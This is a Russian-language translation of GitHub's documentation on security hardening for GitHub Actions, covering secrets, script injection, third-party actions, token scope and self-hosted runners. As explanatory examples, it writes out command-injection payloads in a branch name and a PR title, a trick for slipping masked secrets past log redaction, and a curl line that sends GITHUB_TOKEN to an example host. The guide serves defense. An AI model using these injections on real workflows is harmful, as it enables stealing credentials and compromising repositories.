---
title: Защита системы безопасности для GitHub Actions
shortTitle: Security hardening
intro: 'Рекомендации по безопасности при использовании функций {% data variables.product.prodname_actions %}.'
redirect_from:
  - /actions/getting-started-with-github-actions/security-hardening-for-github-actions
  - /actions/learn-github-actions/security-hardening-for-github-actions
versions:
  fpt: '*'
  ghes: '*'
  ghae: '*'
  ghec: '*'
type: overview
topics:
  - Security
miniTocMaxHeadingLevel: 3
ms.openlocfilehash: 0f93496361500083c23ef6f5095a785855246503
ms.sourcegitcommit: b617c4a7a1e4bf2de3987a86e0eb217d7031490f
ms.translationtype: MT
ms.contentlocale: ru-RU
ms.lasthandoff: 11/11/2022
ms.locfileid: '148161218'
---
{% data reusables.actions.enterprise-beta %} {% data reusables.actions.enterprise-github-hosted-runners %}

## Обзор

В этом руководстве объясняется, как настроить усиление безопасности для определенных функций {% data variables.product.prodname_actions %}. Если понятия {% data variables.product.prodname_actions %} вам незнакомы, см. статью [Основные понятия для GitHub Actions](/actions/getting-started-with-github-actions/core-concepts-for-github-actions).

## Использование секретов

Конфиденциальные значения никогда не должны храниться в виде открытого текста в файлах рабочего процесса, а должны храниться как секреты. [Секреты](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets) можно настроить на уровне организации, репозитория или окружения и позволить хранить конфиденциальную информацию в {% data variables.product.product_name %}.

Секреты используют [запечатанные коробки Libsodium](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes), поэтому они шифруются до достижения {% data variables.product.product_name %}. Это происходит, когда секрет отправляется [с помощью пользовательского интерфейса](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository) или через [REST API](/rest/reference/actions#secrets). Это шифрование на стороне клиента помогает минимизировать риски, связанные со случайным ведением журналов (например, журналы исключений и журналы запросов и т. д.) в инфраструктуре {% data variables.product.product_name %}. После отправки секрета {% data variables.product.product_name %} сможет потом расшифровать его, чтобы его можно было внедрить в среду выполнения workflow-процессов.

Для предотвращения случайного раскрытия данных {% data variables.product.product_name %} использует механизм, который пытается редактировать секреты, отображаемые в журналах выполнения. Это исправление ищет точные совпадения любых настроенных секретов, а также общее кодирование значений, такие как Base64. Но так как значение секрета можно преобразовать несколькими способами, такое исправление не гарантировано. Как результат, есть определенные упреждающие действия и рекомендации, которым вы должны следовать, чтобы обеспечить скрытие секретов и ограничить другие риски, связанные с секретами:

- **Никогда не используйте структурированные данные в качестве секрета**
    - Структурированные данные могут привести к сбою скрытия секрета в журналах, так как скрытие в значительной степени зависит от поиска точного соответствия для конкретного значения секрета. Например, не используйте большой двоичный объект JSON, XML или YAML (или аналогичный указанным) для инкапсуляции секретного значения, так как это значительно снижает вероятность того, что секреты будут правильно скрыты. Вместо этого создайте отдельные секреты для каждого конфиденциального значения.
- **Зарегистрируйте все секреты, используемые в рабочих процессах**
    - Если секрет используется для создания другого конфиденциального значения в рабочем процессе, созданное значение должно быть официально [зарегистрировано как секрет](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret), чтобы он отображался в журналах. Например, если вы используете закрытый ключ для создания подписанного JWT для доступа к веб-API, обязательно зарегистрируйте этот JWT как секрет, иначе он не будет скрыт, если он когда-либо попадет в выходные данные журнала.
    - Регистрация секретов также применяется к любому типу преобразования или кодирования. Если ваш секрет каким-либо образом преобразован (например, в кодировке Base64 или URL), обязательно зарегистрируйте новое значение в качестве секрета.
- **Выполняйте аудит обработки секретов**
    - Выполните аудит использования секретов, чтобы убедиться, что они обрабатываются должным образом. Это можно сделать, просмотрев исходный код репозитория, выполняющего рабочий процесс, и проверив все действия, используемые в рабочем процессе. Например, убедитесь, что они не отправляются на непредусмотренные узлы или непосредственно не печатаются для вывода журнала.
    - Просмотрите журналы выполнения для вашего рабочего процесса после проверки допустимых/недопустимых входных данных и убедитесь, что секреты правильно скрыты или не отображаются. Не всегда очевидно, как вызываемая команда или средство будет отправлять ошибки в `STDOUT` и `STDERR`, а секреты в дальнейшем могут оказаться в журналах ошибок. Поэтому рекомендуется вручную просматривать журналы рабочего процесса после проверки допустимых и недопустимых входных данных.
- **Используйте учетные данные с минимальной областью действия**
    - Убедитесь, что учетные данные, используемые в рабочих процессах, имеют наименьшие требуемые разрешения, и имейте ввиду, что любой пользователь с доступом на запись в ваш репозиторий имеет доступ на чтение ко всем секретам, настроенным в вашем репозитории. 
    - Действия могут использовать `GITHUB_TOKEN`, обращаясь к нему из контекста `github.token`. Дополнительные сведения см. в разделе «[Контексты](/actions/learn-github-actions/contexts#github-context)». Поэтому необходимо убедиться, что для `GITHUB_TOKEN` предоставлены минимальные требуемые разрешения. В целях безопасности рекомендуется установить разрешение по умолчанию для `GITHUB_TOKEN` на чтение только содержимого репозитория. Затем при необходимости можно увеличить разрешения для отдельных заданий в файле рабочего процесса. Дополнительные сведения см. в статье "[Проверка подлинности в рабочем процессе](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)". 
- **Выполняйте аудит и смену зарегистрированных секретов**
    - Периодически проверяйте зарегистрированные секреты, чтобы убедиться, что они по-прежнему необходимы. Удалите те, которые больше не нужны.
    - Периодически меняйте секреты, чтобы сократить период времени, в течение которого действителен скомпрометированный секрет.
- **Рассмотрите возможность проверки доступа к секретам**
    - Привлекайте необходимых рецензентов для защиты секретов среды. Задание рабочего процесса не может получить доступ к секретам окружения, пока рецензент не создаст утверждение. Дополнительные сведения о хранении секретов в окружениях или необходимости проверки окружений см. в статьях [Зашифрованные секреты](/actions/reference/encrypted-secrets) и [Использование окружений для развертывания](/actions/deployment/using-environments-for-deployment).

{% warning %}

**Предупреждение**. Любой пользователь с доступом на запись к репозиторию имеет доступ на чтение ко всем секретам, настроенным в репозитории. Поэтому необходимо убедиться, что учетные данные, используемые в рабочих процессах, имеют наименьшие требуемые разрешения.

{% endwarning %}

## Использование `CODEOWNERS` для отслеживания изменений

Вы можете использовать функцию `CODEOWNERS` для управления внесением изменений в файлы рабочего процесса. Например, если все файлы вашего рабочего процесса хранятся в `.github/workflows`, можно добавить этот каталог в список владельцев кода, чтобы любые предлагаемые изменения в этих файлах сначала требовали утверждения назначенным рецензентом.

Дополнительные сведения см. в разделе [Сведения о владельцах кода](/github/creating-cloning-and-archiving-repositories/about-code-owners).

## Осознание риска внедрения скриптов

При создании рабочих процессов, [настраиваемых действий](/actions/creating-actions/about-actions) и [составных действий](/actions/creating-actions/creating-a-composite-action) всегда следует учитывать, не может ли код выполнять ненадежные входные данные от злоумышленников. Это может произойти, когда злоумышленник добавляет в контекст вредоносные команды и сценарии. При запуске рабочего процесса эти строки могут быть интерпретированы как код, который затем выполняется в средстве выполнения тестов.

 Злоумышленники могут добавлять собственное вредоносное содержимое в [`github`контекст](/actions/reference/context-and-expression-syntax-for-github-actions#github-context), что следует рассматривать как потенциально ненадежные входные данные. Эти контексты обычно заканчиваются на `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref` и `title`.  Например `github.event.issue.title` или `github.event.pull_request.body`.

 Следует убедиться, что эти значения не передаются непосредственно в рабочие процессы, действия, вызовы API или куда-либо еще, где они могут быть интерпретированы как исполняемый код. Применяя ту же защитную позицию программирования, которую вы бы использовали для любого другого кода привилегированного приложения, вы можете помочь системе безопасности усилить использование {% data variables.product.prodname_actions %}. Сведения о некоторых шагах, которые может предпринять злоумышленник, см. в статье [Потенциальное влияние скомпрометированного средства выполнения тестов](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner).

Кроме того, существуют и другие менее очевидные источники потенциально ненадежных входных данных, такие как имена ветвей и адреса электронной почты, которые могут быть весьма гибкими с точки зрения разрешенного содержания. Например, `zzz";echo${IFS}"hello";#` будет допустимым именем ветви и возможным вектором атаки на целевой репозиторий.

В следующих разделах показано, как снизить риск внедрения скриптов.

### Пример атаки путем внедрения сценария

Атака путем внедрения сценария может произойти непосредственно во встроенном сценарии рабочего процесса. В следующем примере действие использует выражение для проверки достоверности заголовка запроса на вытягивание, но также добавляет риск внедрения сценария:

{% raw %}
```
      - name: Check PR title
        run: |
          title="${{ github.event.pull_request.title }}"
          if [[ $title =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

Этот пример уязвим для внедрения сценария, так как команда `run` выполняется во временном сценарии оболочки в средстве выполнения тестов. Перед запуском сценария оболочки выражения внутри {% raw %}`${{ }}`{% endraw %} оцениваются, а затем заменяются полученными значениями, что может сделать сценарий уязвимым для внедрения команд оболочки.

Чтобы внедрить команды в этот рабочий процесс, злоумышленник может создать запрос на вытягивание с заголовком `a"; ls $GITHUB_WORKSPACE"`:

![Пример внедрения скрипта в заголовке запроса на вытягивание](/assets/images/help/images/example-script-injection-pr-title.png)

В этом примере символ `"` используется для прерывания инструкции {% raw %}`title="${{ github.event.pull_request.title }}"`{% endraw %}, позволяя выполнять команду `ls` в средстве выполнения. Вы увидите выходные данные команды `ls` в журнале:

![Пример результата внедрения сценария](/assets/images/help/images/example-script-injection-result.png)

## Рекомендации по устранению атак путем внедрения сценария

Существует ряд различных подходов, которые помогут снизить риск внедрения сценариев:

### Использование действия вместо встроенного сценария (рекомендуется)

Рекомендуемым подходом является создание действия, которое обрабатывает значение контекста в качестве аргумента. Этот подход неуязвим для атаки путем внедрения, так как значение контекста не используется для создания сценария оболочки, а вместо этого передается действию в качестве аргумента:

{% raw %}
```
uses: fakeaction/checktitle@v3
with:
    title: ${{ github.event.pull_request.title }}
```
{% endraw %}

### Использование промежуточной переменной среды

Для встроенных сценариев предпочтительным подходом к обработке ненадежных входных данных является установка значения выражения в промежуточную переменную среды.

В следующем примере используется Bash для обработки значения `github.event.pull_request.title` в качестве переменной среды:

{% raw %}
```
      - name: Check PR title
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: |
          if [[ "$TITLE" =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

В этом примере попытка внедрения сценария завершается неудачно:

![Пример внедрения сценария с устранением рисков](/assets/images/help/images/example-script-injection-mitigated.png)

При таком подходе значение выражения {% raw %}`${{ github.event.issue.title }}`{% endraw %} хранится в памяти, используется в качестве переменной и не взаимодействует с процессом создания сценария. Кроме того, рассмотрите возможность использования переменных оболочки в двойных кавычках, чтобы избежать [разбиения слов](https://github.com/koalaman/shellcheck/wiki/SC2086), но это [одна из многих](https://mywiki.wooledge.org/BashPitfalls) общих рекомендаций по написанию сценариев оболочки, и она не относится только к {% data variables.product.prodname_actions %}.

{% ifversion fpt or ghec %}
### Использование начальных рабочих процессов для сканирования кода

{% data reusables.advanced-security.starter-workflows-beta %} {% data variables.product.prodname_code_scanning_capc %} позволяет находить уязвимости системы безопасности до достижения рабочей среды. {% data variables.product.product_name %} предоставляет начальные рабочие процессы для таких функций по обеспечению безопасности, как {% data variables.product.prodname_code_scanning %}. Предложенные рабочие процессы можно использовать для создания рабочих процессов {% data variables.product.prodname_code_scanning %} вместо того, чтобы начинать с нуля. Рабочий процесс {% data variables.product.company_short%}, {% data variables.code-scanning.codeql_workflow %}, работает на {% data variables.product.prodname_codeql %}. Доступны также сторонние начальные рабочие процессы.

Дополнительные сведения см. в статье [Сведения о {% data variables.product.prodname_code_scanning %}](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/about-code-scanning) и [Настройка {% data variables.product.prodname_code_scanning %} с помощью начальных рабочих процессов](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/setting-up-code-scanning-for-a-repository#setting-up-code-scanning-using-starter-workflows).

{% endif %}

### Ограничение разрешений для токенов

Чтобы снизить риск незащищенного токена, рассмотрите возможность ограничения назначенных разрешений. Дополнительные сведения см. в статье [Изменение разрешений для GITHUB_TOKEN](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token).

{% ifversion fpt or ghec or ghes > 3.4 %}

## Использование OpenID Connect для доступа к облачным ресурсам

{% data reusables.actions.about-oidc-short-overview %}

{% endif %}

## Использование действий третьих лиц

Отдельные задания в рабочем процессе могут взаимодействовать c другими заданиями (и подвергать их риску). Например, задание, запрашивающее переменные среды, используемые более поздним заданием, записывающее файлы в общий каталог, который обрабатывает более позднее задание, или даже более непосредственно, взаимодействуя с сокетом Docker и проверяя другие запущенные контейнеры и выполняя в них команды.

Это означает, что компрометация одного действия в рабочем процессе может иметь очень большое значение, так как это скомпрометированное действие будет иметь доступ ко всем секретам, настроенным в вашем репозитории, и может использовать `GITHUB_TOKEN` для записи в репозиторий. Следовательно, существует значительный риск при поиске действий из сторонних репозиториев на {% data variables.product.prodname_dotcom %}. Сведения о некоторых шагах, которые может предпринять злоумышленник, см. в статье [Потенциальное влияние скомпрометированного средства выполнения тестов](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner).

Вы можете помочь снизить этот риск, выполнив следующие рекомендации:

* **Закрепление действий в SHA полной фиксации**

  Закрепление действия в SHA полной фиксации сейчас является единственным способом использования действия в качестве неизменяемого выпуска. Закрепление в определенном SHA помогает снизить риск того, что злоумышленник добавит черный ход в репозиторий действия, так как ему потребуется создать коллизию SHA-1 для действительной полезной нагрузки объекта Git.

* **Аудит исходного кода действия**

  Убедитесь, что действие обрабатывает содержимое репозитория и секреты должным образом. Например, убедитесь, что секреты не отправляются на непредусмотренные узлы или не регистрируются самопроизвольно.

* **Закрепляйте действия в теге только в случае доверия автору**

  Хотя закрепление в фиксации SHA является наиболее безопасным вариантом, указание тега — это более удобный и широко используемый метод. Если вы хотите указать тег, убедитесь, что вы доверяете авторам действия. Индикатор событий "Проверенный автор" на {% data variables.product.prodname_marketplace %} является полезным сигналом, так как он указывает, что действие было создано командой, удостоверение которой проверено с помощью {% data variables.product.prodname_dotcom %}. Обратите внимание, что в этом подходе есть риск, даже если вы доверяете автору, потому что тег может быть перемещен или удален, если злоумышленник получит доступ к репозиторию, в котором хранится действие.

{% ifversion fpt or ghes > 3.3 or ghae > 3.3 or ghec %}
## Повторное использование сторонних рабочих процессов

Те же самые принципы, описанные выше для использования сторонних действий, также применимы к использованию сторонних рабочих процессов. Вы можете снизить риски, связанные с повторным использованием рабочих процессов, следуя тем же рекомендациям, которые описаны выше. Дополнительные сведения см. в статье [Многократное использование рабочих процессов](/actions/learn-github-actions/reusing-workflows).
{% endif %}

{% ifversion internal-actions %}
## Предоставление рабочим процессам доступа к внутренним репозиториям

{% data reusables.actions.outside-collaborators-internal-actions %} Дополнительные сведения см. в статье [Общий доступ к действиям и рабочим процессам в организации](/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise).
{% endif %}

{% ifversion allow-actions-to-approve-pr %}
## Запрет {% data variables.product.prodname_actions %} на {% ifversion allow-actions-to-approve-pr-with-ent-repo %}создание или {% endif %}утверждение запросов на вытягивание

{% data reusables.actions.workflow-pr-approval-permissions-intro %} Разрешение рабочим процессам или любой другой автоматизации {% ifversion allow-actions-to-approve-pr-with-ent-repo %}создавать или {% endif %}утверждать запросы на вытягивание может представлять угрозу безопасности, если запрос на вытягивание объединен без должного контроля.

Дополнительные сведения о настройке этого параметра см. в статье {% ifversion allow-actions-to-approve-pr-with-ent-repo %}{% ifversion ghes or ghec or ghae %}[Применение политик для {% data variables.product.prodname_actions %} на вашем предприятии](/enterprise-cloud@latest/admin/policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#preventing-github-actions-from-creating-or-approving-pull-requests),{% endif %}{% endif %} [Отключение или ограничение {% data variables.product.prodname_actions %} для вашей организации](/github/setting-up-and-managing-organizations-and-teams/disabling-or-limiting-github-actions-for-your-organization#preventing-github-actions-from-{% ifversion allow-actions-to-approve-pr-with-ent-repo %}creating-or-{% endif %}approving-pull-requests){% ifversion allow-actions-to-approve-pr-with-ent-repo %} и [Управление настройками {% data variables.product.prodname_actions %} для репозитория](/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests){% endif %}.
{% endif %}

## Использование систем показателей OpenSSF для защиты рабочих процессов

[Системы показателей](https://github.com/ossf/scorecard) — это автоматизированное средство безопасности, которое выявляет рискованные действия в цепочке поставок. Вы можете использовать [действие системы показателей](https://github.com/marketplace/actions/ossf-scorecard-action) и [стартовый рабочий процесс](https://github.com/actions/starter-workflows), чтобы следовать рекомендациям по обеспечению безопасности. После настройки действие системы показателей автоматически запускается при изменении репозитория и предупреждает разработчиков о рискованных методах цепочки поставок с помощью встроенного средства сканирования кода. Проект системы показателей выполняет ряд проверок, включая атаки путем внедрения сценария, разрешения токенов и закрепленные действия.

## Потенциальное влияние скомпрометированного средства выполнения тестов

В этих разделах рассматриваются некоторые шаги, которые может предпринять злоумышленник, если он сможет запускать вредоносные команды в средстве выполнения тестов {% data variables.product.prodname_actions %}.

{% note %}

**Примечание.** Средства выполнения тестов, размещенные в {% data variables.product.prodname_dotcom %}, не проверяют наличие вредоносного кода, загруженного пользователем во время его работы, например скомпрометированную стороннюю библиотеку.

{% endnote %}

### Доступ к секретам

Рабочие процессы, активированные с помощью события `pull_request`, имеют разрешения только на чтение и не имеют доступа к секретам. Однако эти разрешения различаются для различных триггеров событий, таких как `issue_comment`, `issues` и `push`, когда злоумышленник может попытаться украсть секреты репозитория или использовать разрешение на запись задания [`GITHUB_TOKEN`](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token).

- Если для секрета или маркера задана переменная среды, прямой доступ к нему можно получить через окружение с помощью `printenv`.
- Если секрет используется непосредственно в выражении, созданный сценарий оболочки хранится на диске и является доступным.
- Для пользовательского действия риск может варьироваться в зависимости от того, как программа использует секрет, полученный из аргумента:

  {% raw %}
  ```
  uses: fakeaction/publish@v3
  with:
      key: ${{ secrets.PUBLISH_KEY }}
  ```
  {% endraw %}

Хотя {% data variables.product.prodname_actions %} удаляет из памяти секреты, на которые не ссылается рабочий процесс (или включенное действие), определенный злоумышленник может собрать `GITHUB_TOKEN` и любые секреты, на которые указывает ссылка.

### Извлечение данных из средства выполнения тестов

Злоумышленник может получить все украденные секреты или другие данные от средства выполнения тестов. Чтобы предотвратить случайное раскрытие секрета, {% data variables.product.prodname_actions %} [автоматически скрывает секреты, напечатанные в журнале](/actions/reference/encrypted-secrets#accessing-your-secrets), но это не является реальной границей безопасности, так как секреты могут быть намеренно отправлены в журнал. Например, скрытые секреты можно перенести с помощью `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`. Кроме того, так как злоумышленник может выполнять произвольные команды, он может использовать HTTP-запросы для отправки секретов или других данных репозитория на внешний сервер.

### Кража `GITHUB_TOKEN` задания

Злоумышленник может украсть `GITHUB_TOKEN` задания. Средство выполнения тестов {% data variables.product.prodname_actions %} автоматически получает созданный `GITHUB_TOKEN` с разрешениями, которые ограничены только репозиторием, содержащим рабочий процесс, и срок действия маркера истекает после завершения задания. После истечения срока действия токен больше ничем не поможет злоумышленнику. Чтобы обойти это ограничение, злоумышленники могут автоматизировать атаку и выполнить ее в доли секунды путем вызова управляемого злоумышленником сервера с токеном, например: `a"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#`.

### Изменение содержимого репозитория

Сервер злоумышленника может использовать API {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %} для [изменения содержимого репозитория](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token), включая выпуски, если назначенные разрешения `GITHUB_TOKEN` [не ограничены](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token).

## Рассмотрение возможности доступа между репозиториями

{% data variables.product.prodname_actions %} намеренно ограничивается до одного репозитория за один раз. `GITHUB_TOKEN` предоставляет тот же уровень доступа, что и у пользователя с доступом на запись, так как любой пользователь с доступом на запись может получить доступ к этому токену, создав или изменив файл рабочего процесса, повышая разрешения `GITHUB_TOKEN`, если есть необходимость. У пользователей есть определенные разрешения для каждого репозитория, поэтому разрешение `GITHUB_TOKEN` для одного репозитория предоставлять доступ к другому повлияет на модель разрешений {% data variables.product.prodname_dotcom %}, если она не реализована тщательно. Аналогичным образом следует соблюдать осторожность при добавлении токенов проверки подлинности {% data variables.product.prodname_dotcom %} в рабочий процесс, так как это также может повлиять на модель разрешений {% data variables.product.prodname_dotcom %} путем случайного предоставления широкого доступа к участникам совместной работы.

У нас есть [план по стратегии развития {% data variables.product.prodname_dotcom %}](https://github.com/github/roadmap/issues/74) для поддержки потока, который обеспечивает доступ между репозиториями в {% data variables.product.product_name %}, но это еще не поддерживаемая функция. На данный момент единственным способом выполнения привилегированного взаимодействия между репозиториями является размещение токена проверки подлинности {% data variables.product.prodname_dotcom %} или ключа SSH в качестве секрета в рабочем процессе. Так как многие типы токенов проверки подлинности не обеспечивают детальный доступ к определенным ресурсам, существует значительный риск при использовании неправильного типа токена, потому что он может предоставить гораздо более широкий доступ, чем предполагалось.

В этом списке описаны рекомендуемые подходы по доступу к данным репозитория в рамках рабочего процесса в порядке убывания предпочтения:

1. **Токен `GITHUB_TOKEN`**
    -  Этот токен намеренно привязан к одному репозиторию, вызвавшему рабочий процесс, и может иметь тот же уровень доступа, что и пользователь доступа на запись в репозитории. Токен создается перед началом каждого задания и истекает по его завершении. Дополнительные сведения см. в разделе [Проверка подлинности с помощью GITHUB_TOKEN](/actions/configuring-and-managing-workflows/authenticating-with-the-github_token).
    - `GITHUB_TOKEN` следует использовать всякий раз, когда это возможно.
2. **Ключи развертывания репозитория**
    - Ключи развертывания — это один из немногих типов учетных данных, которые предоставляют доступ на чтение или запись к одному репозиторию и могут использоваться для взаимодействия с другим репозиторием в рамках рабочего процесса. Дополнительные сведения см. в разделе [Управление ключами развертывания](/developers/overview/managing-deploy-keys#deploy-keys).
    - Обращаем ваше внимание на то, что ключи развертывания могут клонировать и отправлять их в репозиторий с помощью Git и не могут использоваться для взаимодействия с REST API или API GraphQL, поэтому они могут не соответствовать вашим требованиям.
3. **Токены {% data variables.product.prodname_github_app %}**
    - {% data variables.product.prodname_github_apps %} можно установить в выбранных репозиториях и они имеют детальные разрешения на ресурсы в них. Вы можете создать {% data variables.product.prodname_github_app %} в своей организации, установить их в репозиториях, к которым вам нужен доступ в рамках рабочего процесса, и выполнить проверку подлинности в качестве установки в рабочем процессе для доступа к этим репозиториям.
4. **{% data variables.product.pat_generic %}s**
    - Никогда не используйте {% data variables.product.pat_v1 %}. Эти токены предоставляют доступ ко всем репозиториям внутри организаций, к которым у вас есть доступ, а также ко всем личным репозиториям в вашем личном кабинете. Это косвенно предоставляет широкий доступ всем пользователям с доступом на запись в репозитории, в котором находится рабочий процесс.
    - Если вы используете {% data variables.product.pat_generic %}, никогда не следует использовать {% data variables.product.pat_generic %} из собственной учетной записи. Если позже вы покинете организацию, рабочие процессы, использующие этот маркер, немедленно прервутся, и отладка этой проблемы может оказаться сложной задачей. Вместо этого следует использовать {% ifversion pat-v2%}{% data variables.product.pat_v2 %}s{% else %}{% data variables.product.pat_generic %}s{% endif %} для новой учетной записи, которая принадлежит вашей организации и которой предоставляется доступ только к определенным репозиториям, необходимым для рабочего процесса. Обратите внимание, что этот подход не является масштабируемым и его следует избегать в пользу альтернативных вариантов, таких как развертывание ключей.
5. **Ключи SSH в личной учетной записи**
    - Для рабочих процессов никогда не следует использовать ключи SSH в личной учетной записи. Как и {% data variables.product.pat_v1_plural %}, они предоставляют разрешения на чтение и запись всем вашим личным репозиториям, а также всем репозиториям, к которым у вас есть доступ через членство в организации.  Это косвенно предоставляет широкий доступ всем пользователям с доступом на запись в репозитории, в котором находится рабочий процесс. Если вы собираетесь использовать ключ SSH, потому что вам нужно только выполнять клонирование или отправку репозитория и не нужно взаимодействовать с общедоступными API, вместо этого вам следует использовать отдельные ключи развертывания.

## Усиление защиты для средств выполнения тестов локального размещения

{% ifversion fpt or ghec %} Средства выполнения тестов, **размещенные на {% data variables.product.prodname_dotcom %}** , выполняют код во временных и чистых изолированных виртуальных машинах, что означает, что нет возможности постоянно компрометировать это окружение или иным образом получить доступ к большему количеству информации, чем было размещено в этом окружении во время процесса начальной загрузки.
{% endif %}

{% ifversion fpt or ghec %}**Локальное размещение**{% elsif ghes or ghae %}Локально размещенные{% endif %} средства выполнения тестов для {% data variables.product.product_name %} не имеют гарантий на выполнение во временных чистых виртуальных машинах и могут быть постоянно скомпрометированы ненадежным кодом в рабочем процессе.

{% ifversion fpt or ghec %}В результате средства выполнения тестов локального размещения практически [никогда не следует использовать для общедоступных репозиториев](/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security) в {% data variables.product.product_name %}, так как любой пользователь может открывать запросы на вытягивание для репозитория и компрометировать среду. Аналогичным образом, будьте{% elsif ghes or ghae %}Будьте{% endif %} осторожны при использовании средств выполнения тестов локального размещения в частных или внутренних репозиториях, так как любой пользователь, кто может разветвить репозиторий и открыть запрос на вытягивание (как правило, те, у кого есть доступ к репозиторию для чтения) может скомпрометировать окружение средства выполнения тестов локального размещения, в том числе получить доступ к секретам и `GITHUB_TOKEN`, который, в зависимости от его параметров, может предоставить доступ на запись в репозиторий. Хотя рабочие процессы могут контролировать доступ к секретам окружения с помощью окружений и обязательных проверок, эти рабочие процессы не запускаются в изолированном окружении и по-прежнему подвержены тем же рискам при запуске в средстве выполнения тестов локального размещения.

Когда средство выполнения тестов локального размещения определено на уровне организации или предприятия, {% data variables.product.product_name %} может планировать рабочие процессы из нескольких репозиториев в одном и том же средстве выполнения тестов. Следовательно, нарушение безопасности этих окружений может привести к серьезным последствиям. Чтобы уменьшить масштабы компрометации, вы можете установить границы, упорядочив средства выполнения тестов локального размещения в отдельные группы. Вы можете ограничить доступ к {% ifversion restrict-groups-to-workflows %}рабочим процессам, {% endif %}организациям и репозиториям для групп средств выполнения тестов. Дополнительные сведения см. в разделе [Управление доступом к средствам выполнения тестов локального размещения с помощью групп](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups).

Следует также рассмотреть окружение компьютеров средств выполнения тестов локального размещения:
- Какие конфиденциальные сведения находятся в компьютере, настроенном в качестве средства выполнения тестов локального размещения? Например, закрытые ключи SSH, маркеры доступа API и другое.
- Имеет ли компьютер сетевой доступ к конфиденциальным службам? Например, к службам метаданных Azure или AWS. Объем конфиденциальной информации в этом окружении должен быть сведен к минимуму, и вы всегда должны помнить, что любой пользователь, способный вызывать рабочие процессы, имеет доступ к этому окружению.

Некоторые клиенты могут попытаться частично снизить эти риски, внедрив системы, которые автоматически уничтожают средство выполнения тестов локального размещения после каждого выполнения задания. Однако этот подход может быть не таким эффективным, как предполагалось, так как нет никакого способа гарантировать, что средство выполнения тестов локального размещения выполняет только одно задание. Некоторые задания будут использовать секреты в качестве аргументов командной строки, которые могут быть видны другому заданию, выполняющемся в том же средстве выполнения тестов, например `ps x -w`. Это может привести к утечкам секретов.

### Планирование стратегии управления для средств выполнения тестов локального размещения

Средство выполнения тестов локального размещения можно добавить на различные уровни в иерархии {% data variables.product.prodname_dotcom %}: уровень предприятия, организации или репозитория. Это размещение определяет, кто сможет управлять средством выполнения тестов:

**Централизованное управление:**
  - Если вы планируете, чтобы централизованная команда владела средствами выполнения тестов локального размещения, рекомендуется добавить свои средства выполнения тестов на самом высоком уровне взаимной организации или предприятия. Это предоставляет вашей команде единое расположение для просмотра ваших средств выполнения тестов и управления ими.
  - Если в вашем распоряжении только одна организация, то добавление средств выполнения тестов на уровне организации — это фактически тот же подход, но при добавлении другой организации в будущем могут возникнуть трудности.

**Децентрализованное управление:**
  - Если каждая команда будет управлять своими собственными средствами выполнения тестов локального размещения, то рекомендуется добавить средства выполнения тестов на самом высоком уровне владения команды. Например, если у каждой команды есть собственная организация, то будет проще, если средства выполнения тестов будут добавлены и на уровне организации.
  - Вы также можете добавить средства выполнения тестов на уровне репозитория, но это добавит накладные расходы на управление, а также увеличит количество необходимых вам средств выполнения тестов, так как вы не можете делиться средствами выполнения тестов между репозиториями.

{% ifversion fpt or ghec or ghes > 3.4 %}
### Проверка подлинности в поставщике облачных служб

Если вы используете {% data variables.product.prodname_actions %} для развертывания в поставщике облачных служб или планируете использовать хранилище HashiCorp для управления секретами, рекомендуется использовать OpenID Connect для создания маркеров доступа с ограниченной областью действия для выполнения рабочего процесса. Дополнительные сведения см. в статье [Сведения об усилении защиты с помощью OpenID Connect](/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect).

{% endif %}

## Аудит событий {% data variables.product.prodname_actions %}

Вы можете использовать журнал аудита для мониторинга административных задач в организации. В журнале аудита записывается тип действия, время его выполнения и личная учетная запись, в которой оно было выполнено.

Например, можно использовать журнал аудита для отслеживания события `org.update_actions_secret`, которое отслеживает изменения секретов организации: ![Записи журнала аудита](/assets/images/help/repository/audit-log-entries.png)

В следующих таблицах описаны события {% data variables.product.prodname_actions %}, которые можно найти в журнале аудита. Дополнительные сведения об использовании журнала аудита см. в статье [Просмотр журнала аудита для вашей организации](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log) и [Просмотр журналов аудита для вашего предприятия](/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise).

{% ifversion fpt or ghec %}
### События для окружений

| Действие | Описание
|------------------|-------------------
| `environment.create_actions_secret` | Активируется при создании секрета в среде. Дополнительную информацию см. в разделе [Секреты среды](/actions/reference/environments#environment-secrets).
| `environment.delete` | Активируется при удалении среды. Дополнительные сведения см. в разделе [Удаление среды](/actions/reference/environments#deleting-an-environment).
| `environment.remove_actions_secret` |  Активируется при удалении секрета из среды. Дополнительную информацию см. в разделе [Секреты среды](/actions/reference/environments#environment-secrets).
